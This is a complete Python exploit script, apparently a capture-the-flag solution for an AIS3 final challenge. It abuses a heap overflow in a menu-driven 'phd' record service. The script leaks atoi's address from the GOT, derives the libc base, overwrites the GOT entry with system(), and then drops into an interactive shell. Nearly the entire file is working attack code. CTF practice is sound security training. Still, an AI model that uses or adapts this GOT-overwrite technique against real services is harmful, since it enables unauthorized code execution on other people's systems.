#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.20"

#port = 8888

host = "final.ais3.org"
port = 3333

sock = make_conn(host,port)

atoi_got = 0x804b03c 
#atoi_off = 0x31860
atoi_off = 0x31560
#sys_off = 0x40190
sys_off = 0x3fcd0

def addphd(sock,name,age,thesis,size = 0):
    recvuntil(sock,":")
    sendline(sock,"2")
    recvuntil(sock,":")
    sendline(sock,name)
    recvuntil(sock,":")
    sendline(sock,str(age))
    recvuntil(sock,":")
    if size :
        sendline(sock,str(size))
    else :
        sendline(sock,str(len(thesis)))
    recvuntil(sock,":")
    sendline(sock,thesis)

def dumpphd(sock,index):
    recvuntil(sock,":")
    sendline(sock,"1")
    recvuntil(sock,":")
    sendline(sock,str(index))
    return recvuntil(sock,"Menu")

def editphd(sock,index,name,age,thesis):
    recvuntil(sock,":")
    sendline(sock,"3")
    recvuntil(sock,":")
    sendline(sock,str(index))
    recvuntil(sock,":")
    sendline(sock,name)
    recvuntil(sock,":")
    sendline(sock,str(age))
    recvuntil(sock,":")
    if len(thesis) :
        sendline(sock,str(len(thesis)))
        recvuntil(sock,":")
        sendline(sock,thesis)
    else :
        sendline(sock,str(len(thesis)))


def removephd(sock,index):
    recvuntil(sock,":")
    sendline(sock,"4")
    recvuntil(sock,":")
    sendline(sock,str(index))

addphd(sock,"ddaa",8,"aaaaaaaa",32)
addphd(sock,"phddaa",16,"bbbbbbbb",32)
editphd(sock,0,"ddaa",24,"")
addphd(sock,"dada",36,"c"*32)
payload = "A"*24
payload += pack32(32)
payload += pack32(atoi_got) 
editphd(sock,0,"phddaa",48,payload)
recvuntil(sock,":")
recvuntil(sock,":")
data = dumpphd(sock,2)
addr = data[-26:-22] #leak
addr = addr.ljust(4,'\x00')
atoi_addr = unpack32(addr)
print "atoiaddr:",hex(atoi_addr)
libc = atoi_addr - atoi_off
print "libcbase:",hex(libc)
system = libc + sys_off
editphd(sock,2,"deedbeef",48,pack32(system)*8)
inter(sock)
